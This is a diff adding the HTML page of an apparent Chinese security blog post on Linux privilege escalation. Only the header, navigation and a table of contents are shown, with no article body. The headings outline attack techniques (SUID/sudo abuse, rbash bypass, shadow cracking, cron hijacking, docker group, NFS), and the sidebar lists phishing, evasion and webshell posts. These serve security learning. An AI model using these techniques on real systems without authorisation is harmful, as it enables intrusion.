@@ -1,0 +1,2280 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Windows%E6%8F%90%E6%9D%83/">
+      
+      
+        <link rel="next" href="../Bypass%20UAC/">
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.3">
+    
+    
+      
+        <title>Linux提权入门刊 - ConsT27's Blog|要做一个低素质玩家</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.c4a75a56.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.a0c5b2b5.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#linux" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="ConsT27&#39;s Blog|要做一个低素质玩家" class="md-header__button md-logo" aria-label="ConsT27's Blog|要做一个低素质玩家" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            ConsT27's Blog|要做一个低素质玩家
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Linux提权入门刊
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="ConsT27&#39;s Blog|要做一个低素质玩家" class="md-nav__button md-logo" aria-label="ConsT27's Blog|要做一个低素质玩家" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    ConsT27's Blog|要做一个低素质玩家
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../about/" class="md-nav__link">
+        About
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          提权
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          提权
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        Windows提权入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Linux提权入门刊
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Linux提权入门刊
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sudo-suid" class="md-nav__link">
+    sudo 和 suid 提权
+  </a>
+  
+    <nav class="md-nav" aria-label="sudo 和 suid 提权">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#suid" class="md-nav__link">
+    何为suid
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo" class="md-nav__link">
+    何为sudo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#suid_1" class="md-nav__link">
+    遍历目录中的suid文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo-l-sudo" class="md-nav__link">
+    用sudo -l 查看哪些命令能被sudo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    可利用于提权的命令
+  </a>
+  
+    <nav class="md-nav" aria-label="可利用于提权的命令">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1nmap" class="md-nav__link">
+    1.nmap
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2find" class="md-nav__link">
+    2.find
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3vim" class="md-nav__link">
+    3.vim
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4bash" class="md-nav__link">
+    4.bash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5lessmore" class="md-nav__link">
+    5.less，more
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6exim" class="md-nav__link">
+    6.exim
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rbash" class="md-nav__link">
+    rbash 绕过
+  </a>
+  
+    <nav class="md-nav" aria-label="rbash 绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#rbash_1" class="md-nav__link">
+    何为rbash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass" class="md-nav__link">
+    bypass
+  </a>
+  
+    <nav class="md-nav" aria-label="bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scp-bypass" class="md-nav__link">
+    scp bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell-bypass" class="md-nav__link">
+    进入命令自带shell bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-bypasss" class="md-nav__link">
+    find bypasss
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass_1" class="md-nav__link">
+    编程语言 bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cp-bypass" class="md-nav__link">
+    cp bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pathshell" class="md-nav__link">
+    直接更改PATH/SHELL变量
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh-bypass" class="md-nav__link">
+    ssh bypass
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    内核提权
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#passwdshadow" class="md-nav__link">
+    passwd和shadow
+  </a>
+  
+    <nav class="md-nav" aria-label="passwd和shadow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    明文密码
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#passwd" class="md-nav__link">
+    passwd 可写
+  </a>
+  
+    <nav class="md-nav" aria-label="passwd 可写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shadow" class="md-nav__link">
+    爆破shadow
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    计划任务
+  </a>
+  
+    <nav class="md-nav" aria-label="计划任务">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    文件重写
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    环境变量劫持
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    通配符提权
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    环境变量
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    密码查找
+  </a>
+  
+    <nav class="md-nav" aria-label="密码查找">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    文件内查找
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    查找十分钟内更改过的文件
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#capabilities" class="md-nav__link">
+    capabilities
+  </a>
+  
+    <nav class="md-nav" aria-label="capabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    实操
+  </a>
+  
+    <nav class="md-nav" aria-label="实操">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cap_setuid" class="md-nav__link">
+    通过cap_setuid
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cap_dac_read_search" class="md-nav__link">
+    通过CAP_DAC_READ_SEARCH
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    Docker
+  </a>
+  
+    <nav class="md-nav" aria-label="Docker">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#docker_1" class="md-nav__link">
+    Docker用户组提权
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nfs" class="md-nav__link">
+    NFS
+  </a>
+  
+    <nav class="md-nav" aria-label="NFS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#no_root_squash" class="md-nav__link">
+    no_root_squash
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bypass%20UAC/" class="md-nav__link">
+        BypassUAC入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          内网渗透
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          内网渗透
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Windows内网基础概览.md" class="md-nav__link">
+        Windows内网渗透入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Windows内网渗透信息搜集指令大全
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        ARP欺骗&DNS欺骗&mac泛洪攻击
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Windows名称解析与相应攻击方法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        横向移动与域控权限维持方法总汇
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        超级水文我自己都不想看第二遍的Mimikatz分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        powershell脚本的分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        家人们来学习代理怎么用
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          权限维持
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          权限维持
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        win&linux本地权限维持入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+          JAVA安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          JAVA安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        java安全入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        7u21链浅析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        JNDI注入原理浅析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        CommonsBeanUtils 反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        RMI ATTACK,攻击RMi
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        C3P0链
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Hessian反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        shiro反序列化(shiro-550与shiro-721)
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Spel表达式注入&相关组件的Spel表达式注入分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        ognl 注入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Log4j2 RCE
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        看我教你怎么打烂Mybatis（指审计）
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅析Weblogic 反序列化漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        java agent内存马
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        Spring Controller内存马
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        tomcat Listener，Filter内存马简要分析
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+          钓鱼
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          钓鱼
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        钓鱼技巧入门杂烩
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+          免杀
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          免杀
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        基础免杀手法暴风吸入
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        WEB人从0开始用C++写一个加壳器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+          一些应用的攻击方式
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          一些应用的攻击方式
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        常见中间件的攻击方式入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        redis攻击方式入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        MongoDB 注入入门刊
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        针对EXCHANGE的攻击方式
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          一些云相关应用的攻击方式
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          一些云相关应用的攻击方式
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么日烂k8s
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么日烂Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅日一下AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        浅日一下阿里云
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        云原生概念入门刊
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+          乐子
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          乐子
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        教你怎么在valorant玩sova打烂东南亚猴子的狗头
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1/" class="md-nav__link">
+        牛批轰轰的深度学习大览
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sudo-suid" class="md-nav__link">
+    sudo 和 suid 提权
+  </a>
+  
+    <nav class="md-nav" aria-label="sudo 和 suid 提权">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#suid" class="md-nav__link">
+    何为suid
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo" class="md-nav__link">
+    何为sudo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#suid_1" class="md-nav__link">
+    遍历目录中的suid文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo-l-sudo" class="md-nav__link">
+    用sudo -l 查看哪些命令能被sudo
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    可利用于提权的命令
+  </a>
+  
